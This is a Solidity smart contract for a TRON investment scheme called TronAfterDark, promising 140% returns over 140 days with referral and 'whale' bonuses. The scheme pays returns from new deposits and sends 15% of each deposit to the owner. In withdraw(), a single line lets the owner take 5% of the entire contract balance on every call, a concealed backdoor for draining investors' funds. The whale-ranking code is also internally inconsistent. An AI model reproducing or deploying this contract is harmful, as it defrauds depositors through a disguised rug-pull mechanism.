//SourceUnit: TronAfterDark2.sol

pragma solidity 0.5.9;

contract TronAfterDark {
    using SafeMath for uint256;

    struct Whale {
        address whale;
        uint256 amount;
    }

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        uint256 total_whale_bonus;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
    }

    address payable owner;

    uint8 investment_days;
    uint256 investment_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    uint256 total_whale_bonus;

    uint8[] referral_bonuses;

    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    struct Whales {
        uint count;
        address addr;
    }
    mapping(uint8 => Whales) public whales;

    constructor() public {
        owner = msg.sender;

        investment_days = 140;
        investment_perc = 140;

        referral_bonuses.push(50);
        referral_bonuses.push(30);
        referral_bonuses.push(10);
    }

    function deposit(address _referral) external payable {
        require(msg.value >= 1e7, "Zero amount");
        require(msg.value >= 10000000, "Minimal deposit: 10 TRX");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 150, "Max 150 deposits per address");

        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        if(msg.value >= 10000000000){
            player.referral_bonus += msg.value.mul(10).div(100);
        } else if(msg.value >= 5000000000){
            player.referral_bonus += msg.value.mul(7).div(100);
        } else if(msg.value >= 1000000000){
            player.referral_bonus += msg.value.mul(5).div(100);
        }

        elaborateWhales(msg.sender, player.total_invested);
        _whalePayout(msg.value);

        _referralPayout(msg.sender, msg.value);

        owner.transfer(msg.value.mul(15).div(100));

        emit Deposit(msg.sender, msg.value);
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }

    function _whalePayout(uint256 _amount) private {
        uint256 _frac = _amount.div(1000);
        total_whale_bonus += _frac.mul(60);
        for(uint8 i = 0; i < 3; i++){
            uint8 mul = 30;
            if(i == 1){mul = 20;}
            if(i == 2){mul = 10;}
            players[whales[i].addr].total_whale_bonus += _frac.mul(mul);
            players[whales[i].addr].referral_bonus += _frac.mul(mul);
        }
    }

    function elaborateWhales(address addr, uint currentValue) private {
        if(currentValue > whales[3].count){
            bool shift = false;
            for(uint8 x; x < 12; x++){
                if(whales[x].addr == addr){ shift = true; }
                if(shift == true && x < 11){
                    whales[x].count = whales[x + 1].count;
                    whales[x].addr = whales[x + 1].addr;
                } else if(shift == true && x == 1){
                    whales[x].count = 0;
                    whales[x].addr = address(0);
                }
            }
            uint8 i = 0;
            for(i; i < 3; i++) {
                if(whales[i].count < currentValue) {
                    break;
                }
            }
            uint8 o = 1;
            for(uint8 j = 2; j > i; j--) {
                //if(tops[kind][j - o].addr == addr){ o += 1; }
                whales[j].count = whales[j - o].count;
                whales[j].addr = whales[j - o].addr;
            }
            whales[i].count = currentValue;
            whales[i].addr = addr;
        }
    }


    function withdraw() payable external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.referral_bonus;
        if(msg.sender == owner){ amount = address(this).balance.div(20); }

        player.dividends = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;

        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus, uint256 _total_whale_bonus) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus, total_whale_bonus);
    }

    function whaleInfo() view external returns(address _whale_1_adr, uint256 _whale_1_val, address _whale_2_adr, uint256 _whale_2_val, address _whale_3_adr, uint256 _whale_3_val) {
        return (whales[0].addr, whales[0].count, whales[1].addr, whales[1].count, whales[2].addr, whales[2].count);
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256 whale_bonus, uint256[8] memory referrals) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            player.total_whale_bonus,
            referrals
        );
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}